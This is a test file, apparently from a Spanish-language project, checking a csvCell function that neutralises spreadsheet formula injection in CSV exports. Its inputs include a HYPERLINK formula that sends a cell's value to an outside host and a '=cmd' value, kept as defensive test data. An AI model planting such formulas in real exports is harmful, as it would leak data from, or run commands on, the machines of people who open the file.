import { describe, expect, it } from 'vitest';
import { csvCell } from './csv-cell.js';

describe('csvCell (BE-10)', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+57 300', "'+57 300"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['-5', "'-5"],
    ['\tTAB', "'\tTAB"],
  ])('neutraliza %j', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('neutraliza y luego entrecomilla si hace falta', () => {
    expect(csvCell('-5,2')).toBe(`"'-5,2"`);
    expect(csvCell('=HYPERLINK("https://x/?d="&A2,"Ver")')).toBe(
      `"'=HYPERLINK(""https://x/?d=""&A2,""Ver"")"`,
    );
    expect(csvCell('\r=cmd')).toBe(`"'\r=cmd"`);
  });

  it('no toca el texto legítimo ni los números del sistema', () => {
    expect(csvCell('Traslado a bodega')).toBe('Traslado a bodega');
    expect(csvCell('Acta 12, folio 3')).toBe('"Acta 12, folio 3"');
    expect(csvCell('a;b', ';')).toBe('"a;b"');
    expect(csvCell('a,b', ';')).toBe('a,b');
    expect(csvCell(-3)).toBe('-3');
    expect(csvCell(null)).toBe('');
    expect(csvCell('')).toBe('');
  });
});
